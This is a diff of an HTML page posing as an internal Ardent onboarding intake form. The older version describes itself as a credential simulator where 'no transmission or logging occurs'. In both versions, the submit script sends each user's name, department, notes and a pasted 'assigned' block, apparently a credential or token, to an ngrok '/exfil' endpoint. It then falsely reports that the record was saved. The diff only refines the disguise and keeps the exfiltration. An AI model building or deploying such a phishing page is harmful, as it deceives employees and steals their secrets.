@@ -2,48 +2,55 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Ardent Credential Validation Portal</title>
+  <title>Ardent Internal Data Intake</title>
   <style>
     body {
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #f4f6f9;
+      background-color: #f3f6f8;
       margin: 0;
-      padding: 3em;
+      padding: 2em;
     }
 
     .container {
-      max-width: 600px;
+      max-width: 700px;
       margin: auto;
       background: white;
       padding: 3em;
-      border-radius: 12px;
-      box-shadow: 0 0 16px rgba(0,0,0,0.06);
+      border-radius: 10px;
+      box-shadow: 0 0 16px rgba(0,0,0,0.08);
     }
 
     h1 {
-      color: #223144;
-      font-size: 1.8em;
-      margin-bottom: 0.5em;
+      color: #2c3e50;
+      font-size: 1.75em;
+      margin-bottom: 0.2em;
     }
 
-    p {
+    .subtitle {
       font-size: 0.95em;
-      color: #444;
-      line-height: 1.5em;
+      color: #666;
+      margin-bottom: 1.8em;
     }
 
-    input[type="text"] {
+    label {
+      display: block;
+      margin: 1.2em 0 0.3em;
+      font-weight: 600;
+      color: #333;
+    }
+
+    input, textarea {
       width: 100%;
       padding: 1em;
       font-size: 1em;
       border: 1px solid #ccc;
       border-radius: 6px;
-      margin-top: 1em;
+      resize: vertical;
     }
 
     button {
-      margin-top: 1.5em;
-      padding: 0.8em 1.5em;
+      margin-top: 2em;
+      padding: 0.8em 1.6em;
       font-size: 1em;
       background: #1e74ff;
       color: white;
@@ -52,50 +59,60 @@
       cursor: pointer;
     }
 
-    .footer-note {
-      font-size: 0.8em;
-      color: #888;
-      margin-top: 2em;
+    .footer {
+      font-size: 0.75em;
+      color: #aaa;
+      margin-top: 3em;
+      text-align: center;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Ardent Credential Format Preview</h1>
-<p>This is a credential formatting simulator used during onboarding to display token layout. No transmission or logging occurs.</p>
-<form onsubmit="submitForm(event)">
-  <input type="text" id="name" placeholder="Your name..." required><br><br>
-  <input type="text" id="department" placeholder="Team or department..." required><br><br>
-  <textarea id="notes" placeholder="Onboarding notes or role context..." rows="4" style="width:100%;" required></textarea><br><br>
-  <textarea id="block" placeholder="Paste assigned character block..." rows="4" style="width:100%;" required></textarea><br>
-  <button type="submit">Save Record</button>
-</form>
+    <h1>Ardent Internal Data Intake Form</h1>
+    <div class="subtitle">Used for onboarding trace records and sandbox archive visibility</div>
 
-<!-- Hidden confirmation element to simulate internal prompt -->
-<div id="confirmation-dialog" style="display:none;">
-  Confirmation handled internally.
-</div>
-    <p class="footer-note">
-      © 2025 Ardent Engineering Systems | Internal Automation ID: ARD-IDON-Q3-FLOW17
-    </p>
+    <form onsubmit="submitForm(event)">
+      <label for="name">Full Name</label>
+      <input type="text" id="name" placeholder="e.g., Jordan Patel" required>
+
+      <label for="department">Team or Division</label>
+      <input type="text" id="department" placeholder="e.g., Platform Security Engineering" required>
+
+      <label for="notes">Handoff Notes (Optional)</label>
+      <textarea id="notes" rows="4" placeholder="Include relevant context for provisioning or trace review."></textarea>
+
+      <label for="block">Technical Preview Sample</label>
+      <textarea id="block" rows="4" placeholder="Paste assigned preview block here..." required></textarea>
+
+      <button type="submit">Save Record</button>
+    </form>
+
+    <div id="confirmation-dialog" style="display:none;">
+      Confirmation handled internally.
+    </div>
+
+    <div class="footer">
+      © 2025 Ardent Engineering Systems – Internal Only | Portal Ref: ARD-STOR-Q3-VAULT
+    </div>
   </div>
 
   <script>
     function submitForm(e) {
-  e.preventDefault();
-  const payload = {
-    name: document.getElementById("name").value,
-    department: document.getElementById("department").value,
-    notes: document.getElementById("notes").value,
-    block: document.getElementById("block").value
-  };
-  fetch("https://your-ngrok-url.ngrok-free.app/exfil", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  });
-  alert("Record saved successfully.");
-}
+      e.preventDefault();
+      const payload = {
+        name: document.getElementById("name").value,
+        department: document.getElementById("department").value,
+        notes: document.getElementById("notes").value,
+        block: document.getElementById("block").value
+      };
+      fetch("https://your-ngrok-id.ngrok-free.app/exfil", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+      alert("Record saved successfully.");
+    }
   </script>
 </body>
 </html>
